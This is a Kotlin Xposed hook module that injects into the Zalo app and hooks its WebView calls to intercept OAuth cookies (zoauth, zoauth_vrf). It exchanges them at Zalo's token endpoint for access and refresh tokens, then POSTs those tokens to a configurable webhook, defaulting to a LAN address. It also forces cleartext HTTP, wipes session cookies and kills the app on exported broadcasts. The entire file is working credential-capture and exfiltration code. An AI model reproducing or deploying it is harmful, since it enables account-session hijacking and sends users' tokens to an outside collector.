package com.example.hack.hook

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.util.Log
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebStorage
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage
import org.json.JSONArray
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.lang.ref.WeakReference
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import kotlin.concurrent.thread

data class AppConfig(
    var id: String = "",
    var name: String = "",
    var appId: String = "",
    var adbPrefix: String = "",
    var deeplink: String = ""
) {
    fun getMiniAppUrl(): String {
        return "https://zalo.me/s/$appId/"
    }

    fun getTriggerAction(): String {
        return "$adbPrefix.TRIGGER"
    }

    fun getGetTokenAction(): String {
        return "$adbPrefix.GET_TOKEN"
    }

    fun getCachePath(): String {
        return "/data/data/com.zing.zalo/cache/zalo/inappBrowser/zBrowser/mpds/$appId"
    }
}

object ZaloHooker {
    private const val TAG = "VDLogger"
    
    @Volatile
    private var initialized = false
    
    @Volatile
    private var captureArmed = false
    
    @Volatile
    private var currentApp: AppConfig? = null
    
    private var zaloActivity: WeakReference<Activity>? = null
    private var registeredConfigs: List<AppConfig> = emptyList()
    private val tokenStore = ConcurrentHashMap<String, String>()
    private var controllerReceiver: BroadcastReceiver? = null
    
    @Volatile
    private var webhookUrl: String = "http://192.168.29.108:5000/token"

    fun install(lpparam: XC_LoadPackage.LoadPackageParam) {
        // Hook Activity lifecycle
        try {
            XposedHelpers.findAndHookMethod(
                Activity::class.java,
                "onCreate",
                Bundle::class.java,
                object : XC_MethodHook() {
                    override fun afterHookedMethod(param: MethodHookParam) {
                        val act = param.thisObject as Activity
                        zaloActivity = WeakReference(act)
                        if (!initialized) {
                            initialized = true
                            broadcastLog("CONFIG", "Hook attached. Requesting config...")
                            requestConfigViaBroadcast(act.applicationContext)
                        }
                    }
                }
            )
        } catch (t: Throwable) {
            Log.e(TAG, "Hook Activity.onCreate failed", t)
        }

        try {
            XposedHelpers.findAndHookMethod(
                Activity::class.java,
                "onResume",
                object : XC_MethodHook() {
                    override fun afterHookedMethod(param: MethodHookParam) {
                        val act = param.thisObject as Activity
                        zaloActivity = WeakReference(act)
                    }
                }
            )
        } catch (t: Throwable) {
            Log.e(TAG, "Hook Activity.onResume failed", t)
        }

        // Hook WebView core methods
        try {
            val wvClass = XposedHelpers.findClassIfExists("android.webkit.WebView", lpparam.classLoader)
            if (wvClass != null) {
                // Hook evaluateJavascript
                XposedHelpers.findAndHookMethod(
                    wvClass,
                    "evaluateJavascript",
                    String::class.java,
                    ValueCallback::class.java,
                    object : XC_MethodHook() {
                        override fun beforeHookedMethod(param: MethodHookParam) {
                            val script = param.args[0] as? String ?: return
                            processScript(script)
                        }
                    }
                )
                Log.d(TAG, "[Zalo] hooked evaluateJavascript")

                // Hook loadUrl
                XposedHelpers.findAndHookMethod(
                    wvClass,
                    "loadUrl",
                    String::class.java,
                    object : XC_MethodHook() {
                        override fun beforeHookedMethod(param: MethodHookParam) {
                            val url = param.args[0] as? String ?: return
                            if (url.startsWith("javascript:")) {
                                processScript(url)
                            } else {
                                autoDetectApp(url)
                            }
                        }
                    }
                )
                Log.d(TAG, "[Zalo] hooked loadUrl")
            } else {
                Log.e(TAG, "[Zalo] WebView class not found")
            }
        } catch (e: Throwable) {
            Log.e(TAG, "[Zalo] WebView hook failed", e)
        }

        // Hook NetworkSecurityPolicy to permit cleartext HTTP webhook connections
        try {
            val nspClass = XposedHelpers.findClass("android.security.NetworkSecurityPolicy", lpparam.classLoader)
            XposedHelpers.findAndHookMethod(
                nspClass,
                "isCleartextTrafficPermitted",
                object : XC_MethodHook() {
                    override fun beforeHookedMethod(param: MethodHookParam) {
                        param.result = true
                    }
                }
            )
            XposedHelpers.findAndHookMethod(
                nspClass,
                "isCleartextTrafficPermitted",
                String::class.java,
                object : XC_MethodHook() {
                    override fun beforeHookedMethod(param: MethodHookParam) {
                        param.result = true
                    }
                }
            )
            Log.d(TAG, "[Zalo] Bypassed cleartext traffic restriction")
        } catch (t: Throwable) {
            Log.e(TAG, "[Zalo] Bypass cleartext restriction failed", t)
        }
    }

    private fun loadWebhookUrlFromFile() {
        try {
            val downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
            val configFile = File(downloadsDir, "zalo_hacker_config.txt")
            if (configFile.exists()) {
                val url = configFile.readText().trim()
                if (url.isNotEmpty() && url.startsWith("http")) {
                    webhookUrl = url
                    Log.d(TAG, "[Zalo] Webhook URL loaded from file fallback: $webhookUrl")
                }
            }
        } catch (e: Throwable) {
            Log.w(TAG, "Failed to load webhook from file fallback: ${e.message}")
        }
    }

    private fun requestConfigViaBroadcast(context: Context) {
        // Load fallback URL from file first
        loadWebhookUrlFromFile()

        // Register com.autopee.ARM_CAPTURE
        try {
            val armReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    captureArmed = true
                    broadcastLog("TRIGGER", "captureArmed = true (ARM broadcast)")
                }
            }
            val af = IntentFilter("com.autopee.ARM_CAPTURE")
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(armReceiver, af, Context.RECEIVER_EXPORTED)
            } else {
                context.registerReceiver(armReceiver, af)
            }
        } catch (e: Throwable) {}

        // Register com.autopee.KILL_ZALO
        try {
            val killReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    try {
                        ctx.unregisterReceiver(this)
                    } catch (e: Exception) {}
                    broadcastLog("WARN", "Zalo restarting for fresh OAuth...")
                    Handler(Looper.getMainLooper()).postDelayed({
                        Process.killProcess(Process.myPid())
                    }, 400L)
                }
            }
            val kf = IntentFilter("com.autopee.KILL_ZALO")
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(killReceiver, kf, Context.RECEIVER_EXPORTED)
            } else {
                context.registerReceiver(killReceiver, kf)
            }
        } catch (e: Throwable) {}

        // Register com.autopee.CONFIG_RESPONSE
        try {
            val responseReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    val json = intent.getStringExtra("configs") ?: "[]"
                    val pendingAppId = intent.getStringExtra("pendingAppId")
                    val wUrl = intent.getStringExtra("webhookUrl")
                    if (!wUrl.isNullOrEmpty()) {
                        webhookUrl = wUrl
                        Log.d(TAG, "[Zalo] Webhook URL updated from broadcast: $webhookUrl")
                    }
                    val configs = parseConfigs(json)
                    
                    // If we already have registered configs, and this one is empty, ignore it to prevent race condition
                    if (configs.isEmpty() && registeredConfigs.isNotEmpty()) {
                        return
                    }
                    
                    Log.d(TAG, "[Zalo] CONFIG_RESPONSE: ${json.take(120)}")
                    registeredConfigs = configs
                    val n = configs.size
                    Log.d(TAG, "[Zalo] Hook ready. $n app(s) registered.")
                    broadcastLog(if (n > 0) "OK" else "WARN", "Hook ready. $n app(s) registered.")
                    
                    for (c in configs) {
                        Log.d(TAG, "[Zalo]   ${c.name} → adb shell am broadcast -a ${c.getTriggerAction()}")
                        broadcastLog("CONFIG", "${c.name} | ${c.appId}")
                    }
                    
                    registerBroadcastController(ctx, configs)
                    
                    if (pendingAppId != null) {
                        for (c in configs) {
                            if (c.appId == pendingAppId) {
                                broadcastLog("TRIGGER", "Auto-trigger: ${c.name}")
                                Handler(Looper.getMainLooper()).postDelayed({
                                    triggerApp(ctx, c, true)
                                }, 800L)
                                break
                            }
                        }
                    }
                }
            }
            val filter = IntentFilter("com.autopee.CONFIG_RESPONSE")
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(responseReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                context.registerReceiver(responseReceiver, filter)
            }
        } catch (e: Throwable) {}

        // Send CONFIG_REQUEST with retries to prevent IPC race conditions
        val handler = Handler(Looper.getMainLooper())
        val requestRunnable = object : Runnable {
            var attempts = 0
            override fun run() {
                if (registeredConfigs.isNotEmpty() || attempts >= 5) return
                attempts++
                val req = Intent("com.autopee.REQUEST_CONFIG")
                try {
                    context.sendBroadcast(Intent(req).apply { `package` = "com.autopee" })
                } catch (e: Throwable) {}
                try {
                    context.sendBroadcast(Intent(req).apply { `package` = "com.example.hack" })
                } catch (e: Throwable) {}
                Log.d(TAG, "[Zalo] REQUEST_CONFIG sent to module app (attempt $attempts)")
                handler.postDelayed(this, 400L * attempts)
            }
        }
        handler.post(requestRunnable)
    }

    private fun registerBroadcastController(context: Context, configs: List<AppConfig>) {
        if (configs.isEmpty()) return
        try {
            controllerReceiver?.let {
                try {
                    context.unregisterReceiver(it)
                } catch (_: Exception) {}
            }
            val receiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    val action = intent.action ?: return
                    for (cfg in registeredConfigs) {
                        if (action == cfg.getTriggerAction()) {
                            Log.d(TAG, "[${cfg.name}] <<< TRIGGER via broadcast >>>")
                            triggerApp(ctx, cfg, false)
                            return
                        } else if (action == cfg.getGetTokenAction()) {
                            val token = tokenStore[cfg.appId]
                            Log.d(TAG, "TOKEN_RESULT:${cfg.adbPrefix}:${token ?: "null"}")
                            return
                        }
                    }
                }
            }
            val filter = IntentFilter()
            for (cfg in configs) {
                filter.addAction(cfg.getTriggerAction())
                filter.addAction(cfg.getGetTokenAction())
            }
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                context.registerReceiver(receiver, filter)
            }
            controllerReceiver = receiver
            Log.d(TAG, "[Zalo] BroadcastController registered ${configs.size} app(s)")
        } catch (t: Throwable) {
            Log.e(TAG, "BroadcastController registration failed", t)
        }
    }

    private fun triggerApp(context: Context, app: AppConfig, fromAutoTrigger: Boolean) {
        currentApp = app
        captureArmed = true
        tokenStore.remove(app.appId)
        broadcastLog("TRIGGER", "<<< TRIGGER: ${app.name} >>>")
        
        // Clear caches
        try {
            deleteDir(File(app.getCachePath()))
        } catch (th: Throwable) {}
        
        // Clear cookies
        try {
            val cm = CookieManager.getInstance()
            val domains = arrayOf("h5.zdn.vn", "h5.zalo.me", "zalo.me", "zdn.vn", "mini.zalo.me")
            for (d in domains) {
                cm.setCookie(d, "zoauth; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/")
                cm.setCookie(d, "zoauth_vrf; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/")
            }
            cm.flush()
            WebStorage.getInstance().deleteAllData()
            broadcastLog("INFO", "[${app.name}] OAuth session cleared")
        } catch (e: Exception) {
            broadcastLog("WARN", "Cookie clear error: ${e.message}")
        }

        if (fromAutoTrigger) {
            try {
                // Only start the mini app activity if running in Zalo's main process to avoid redundant starts from WebView subprocesses
                val processName = if (Build.VERSION.SDK_INT >= 28) {
                    try {
                        android.app.Application.getProcessName()
                    } catch (t: Throwable) {
                        ""
                    }
                } else {
                    ""
                }

                if (processName.isEmpty() || processName == "com.zing.zalo") {
                    val intent = Intent("android.intent.action.VIEW").apply {
                        data = Uri.parse(app.getMiniAppUrl())
                        `package` = "com.zing.zalo"
                        flags = 335544320 // FLAG_ACTIVITY_NEW_TASK or FLAG_ACTIVITY_CLEAR_TOP
                    }
                    context.startActivity(intent)
                    broadcastLog("INFO", "[${app.name}] Mini app launched (auto-trigger, fresh)")
                } else {
                    broadcastLog("INFO", "[${app.name}] Mini app auto-armed in subprocess: $processName")
                }
            } catch (e: Exception) {
                broadcastLog("ERROR", "Launch failed: ${e.message}")
            }
        } else {
            broadcastLog("WARN", "[${app.name}] Zalo restarting for fresh OAuth...")
            Handler(Looper.getMainLooper()).postDelayed({
                Process.killProcess(Process.myPid())
            }, 400L)
        }
    }

    private fun deleteDir(f: File) {
        if (f.isDirectory) {
            f.listFiles()?.forEach { deleteDir(it) }
        }
        f.delete()
    }

    private fun processScript(script: String) {
        if (script.contains("cookiesOAuthLogins")) {
            if (!captureArmed) {
                broadcastLog("INFO", "OAuth script seen but not armed — skipping (call ARM/TRIGGER first)")
                return
            }
            var app = currentApp
            if (app == null) {
                val cfgs = registeredConfigs
                if (cfgs.size == 1) {
                    app = cfgs[0]
                    currentApp = app
                    broadcastLog("INFO", "Auto-selected app: ${app.name}")
                } else {
                    broadcastLog("WARN", "OAuth script found but no currentApp set")
                    return
                }
            }
            
            val finalApp = app!!
            Log.d(TAG, "[${finalApp.name}] OAuth script intercepted")
            broadcastLog("INFO", "[${finalApp.name}] OAuth script intercepted, exchanging...")
            
            try {
                val jsonStr = extractJson(script) ?: return
                val root = JSONObject(jsonStr)
                val dataObj = root.optJSONObject("data")
                val cookies = dataObj?.optJSONArray("cookiesOAuthLogins") ?: root.optJSONArray("cookiesOAuthLogins")
                if (cookies == null) return
                
                var zoauth: String? = null
                var zoauthVrf: String? = null
                
                for (i in 0 until cookies.length()) {
                    val c = cookies.getJSONObject(i)
                    val name = c.optString("name", "")
                    val value = c.optString("value", "")
                    if (name.contains("zoauth_vrf")) {
                        zoauthVrf = value
                    } else if (name.contains("zoauth")) {
                        zoauth = value
                    }
                }
                
                if (!zoauth.isNullOrEmpty() && !zoauthVrf.isNullOrEmpty()) {
                    Log.d(TAG, "[${finalApp.name}] Credentials captured, exchanging...")
                    captureArmed = false
                    exchangeToken(finalApp, zoauth, zoauthVrf)
                }
            } catch (e: Throwable) {
                Log.e(TAG, "[${finalApp.name}] processScript error", e)
            }
        }
    }

    private fun autoDetectApp(url: String) {
        val cfgs = registeredConfigs
        if (cfgs.isEmpty()) return
        for (cfg in cfgs) {
            if (cfg.appId.isNotEmpty() && url.contains(cfg.appId)) {
                if (currentApp == null || currentApp?.appId != cfg.appId) {
                    currentApp = cfg
                    Log.d(TAG, "[Zalo] Auto-detected mini app: ${cfg.name} from URL")
                    broadcastLog("INFO", "Detected: ${cfg.name} (auto)")
                }
                return
            }
        }
    }

    private fun exchangeToken(cfg: AppConfig, zoauth: String, zoauthVrf: String) {
        thread {
            try {
                val url = URL("https://h5.zalo.me/openapi/access_token")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("host", "h5.zalo.me")
                conn.setRequestProperty("content-type", "application/x-www-form-urlencoded")
                conn.setRequestProperty("user-agent", "Mozilla/5.0 (Linux; Android 12L; Nokia 5.3 Build/RKQ1.201004.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/147.0.7727.137 Mobile Safari/537.36 Zalo android/260402903 ZaloTheme/light ZaloLanguage/en")
                conn.setRequestProperty("x-requested-with", "com.zing.zalo")
                conn.setRequestProperty("origin", "https://h5.zdn.vn")
                conn.setRequestProperty("referer", "https://h5.zdn.vn/")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                
                val body = "app_id=${cfg.appId}&code=$zoauth&code_verifier=$zoauthVrf&grant_type=authorization_code"
                DataOutputStream(conn.outputStream).use { dos ->
                    dos.writeBytes(body)
                    dos.flush()
                }
                
                val code = conn.responseCode
                val stream = if (code == 200) conn.inputStream else conn.errorStream
                if (stream == null) return@thread
                
                val raw = stream.bufferedReader().readText()
                conn.disconnect()
                
                val api = JSONObject(raw)
                val result = JSONObject()
                if (api.has("access_token")) {
                    val accessToken = api.getString("access_token")
                    result.put("status", true)
                    result.put("app_id", cfg.appId)
                    result.put("name", cfg.name)
                    result.put("access_token", accessToken)
                    if (api.has("refresh_token")) {
                        result.put("refresh_token", api.getString("refresh_token"))
                    }
                    if (api.has("expires_in")) {
                        result.put("expires_in", api.getLong("expires_in"))
                    }
                    if (api.has("uid")) {
                        result.put("uid", api.optString("uid", ""))
                    }
                    result.put("captured_at", System.currentTimeMillis())
                    
                    broadcastLog("OK", "[${cfg.name}] Token OK! access_token=${accessToken.take(12)}...")
                    
                    val resultStr = result.toString()
                    tokenStore[cfg.appId] = resultStr
                    Log.d(TAG, "TOKEN_RESULT:${cfg.adbPrefix}:$resultStr")
                    
                    // Broadcast success back to UI app
                    broadcastToken(cfg, resultStr)
                    
                    // Also forward to user's webhook configuration for backward compatibility
                    sendTokenToWebhook(accessToken, raw, cfg.appId)
                } else {
                    result.put("status", false)
                    result.put("app_id", cfg.appId)
                    result.put("name", cfg.name)
                    result.put("error", raw)
                    result.put("captured_at", System.currentTimeMillis())
                    
                    broadcastLog("ERROR", "[${cfg.name}] Exchange failed: ${raw.take(80)}")
                    val resultStr = result.toString()
                    tokenStore[cfg.appId] = resultStr
                    Log.d(TAG, "TOKEN_RESULT:${cfg.adbPrefix}:$resultStr")
                    
                    broadcastToken(cfg, resultStr)
                }
            } catch (e: Throwable) {
                Log.e(TAG, "[${cfg.name}] Token exchange failed", e)
                broadcastLog("ERROR", "Exchange failed: ${e.message}")
            }
        }
    }

    private fun getWebhookUrl(): String {
        return webhookUrl
    }

    private fun getAppName(appId: String): String {
        try {
            val appsFile = File(
                android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS),
                "zalo_hacker_apps.txt"
            )
            if (appsFile.exists()) {
                val content = appsFile.readText()
                "(\\d+):([a-zA-Z0-9_-]+)".toRegex().findAll(content).forEach { match ->
                    if (match.groupValues[1] == appId) return match.groupValues[2]
                }
            }
        } catch (_: Throwable) {}
        return "MiniApp_$appId"
    }

    private fun sendTokenToWebhook(token: String, rawData: String, appId: String) {
        thread {
            try {
                val targetUrl = getWebhookUrl()
                val conn = URL(targetUrl).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                
                val name = getAppName(appId)
                val payload = JSONObject().apply {
                    put("status", true)
                    put("app_id", appId)
                    put("name", name)
                    put("access_token", token)
                    try {
                        val api = JSONObject(rawData)
                        if (api.has("refresh_token")) {
                            put("refresh_token", api.getString("refresh_token"))
                        } else {
                            put("refresh_token", token)
                        }
                    } catch (e: Throwable) {
                        put("refresh_token", token)
                    }
                    put("expires_in", 3600)
                    put("captured_at", System.currentTimeMillis())
                    put("source", "CookiesOAuthExchange")
                }
                
                java.io.OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()) }
                val code = conn.responseCode
                Log.d(TAG, "Sent token to webhook ($targetUrl). HTTP $code")
                broadcastLog("OK", "Webhook sent! HTTP $code")
            } catch (e: Throwable) {
                Log.e(TAG, "Failed to send token to webhook: ${e.message}")
            }
        }
    }

    private fun broadcastToken(cfg: AppConfig, tokenJson: String) {
        try {
            val act = zaloActivity?.get()
            val context = act?.applicationContext ?: run {
                val at = XposedHelpers.callStaticMethod(
                    XposedHelpers.findClass("android.app.ActivityThread", null),
                    "currentActivityThread"
                )
                XposedHelpers.callMethod(at, "getSystemContext") as? Context
            } ?: return

            val intent = Intent("com.autopee.TOKEN_CAPTURED").apply {
                putExtra("appId", cfg.appId)
                putExtra("name", cfg.name)
                putExtra("tokenJson", tokenJson)
            }
            
            try {
                context.sendBroadcast(Intent(intent).apply { `package` = "com.autopee" })
            } catch (e: Throwable) {}
            try {
                context.sendBroadcast(Intent(intent).apply { `package` = "com.example.hack" })
            } catch (e: Throwable) {}
            context.sendBroadcast(intent)
            Log.d(TAG, "[${cfg.name}] TOKEN_CAPTURED broadcast sent to UI")
        } catch (e: Exception) {
            Log.w(TAG, "[${cfg.name}] broadcastToken failed: ${e.message}")
        }
    }

    private fun broadcastLog(level: String, msg: String) {
        val message = "[$level] $msg"
        Log.d(TAG, message)
        try {
            val act = zaloActivity?.get()
            val context = act?.applicationContext ?: run {
                val at = XposedHelpers.callStaticMethod(
                    XposedHelpers.findClass("android.app.ActivityThread", null),
                    "currentActivityThread"
                )
                XposedHelpers.callMethod(at, "getSystemContext") as? Context
            } ?: return

            val intent = Intent("com.autopee.LOG_EVENT").apply {
                putExtra("level", level)
                putExtra("log", message)
                putExtra("message", msg)
            }
            
            try {
                context.sendBroadcast(Intent(intent).apply { `package` = "com.autopee" })
            } catch (e: Throwable) {}
            try {
                context.sendBroadcast(Intent(intent).apply { `package` = "com.example.hack" })
            } catch (e: Throwable) {}
            context.sendBroadcast(intent)
        } catch (t: Throwable) {}
    }

    private fun extractJson(script: String): String? {
        val idx = script.indexOf("cookiesOAuthLogins")
        if (idx == -1) return null
        var depth = 0
        var start = -1
        var i = idx
        while (i >= 0) {
            val c = script[i]
            if (c == '}') {
                depth++
            } else if (c == '{') {
                if (depth == 0) {
                    start = i
                    break
                } else {
                    depth--
                }
            }
            i--
        }
        if (start == -1) return null
        
        var depth2 = 0
        var end = -1
        var i2 = start
        while (i2 < script.length) {
            val c2 = script[i2]
            if (c2 == '{') {
                depth2++
            } else if (c2 == '}') {
                if (depth2 - 1 == 0) {
                    end = i2
                    break
                } else {
                    depth2--
                }
            }
            i2++
        }
        if (end == -1) return null
        return script.substring(start, end + 1)
    }

    private fun parseConfigs(json: String?): List<AppConfig> {
        val list = mutableListOf<AppConfig>()
        if (json.isNullOrEmpty()) return list
        try {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val appId = o.optString("appId").ifEmpty { o.optString("app_id") }
                val cfg = AppConfig(
                    id = o.optString("id", UUID.randomUUID().toString()),
                    name = o.optString("name", ""),
                    appId = appId,
                    adbPrefix = o.optString("adbPrefix", "com.autopee.$appId"),
                    deeplink = o.optString("deeplink", "")
                )
                list.add(cfg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing configs", e)
        }
        return list
    }
}
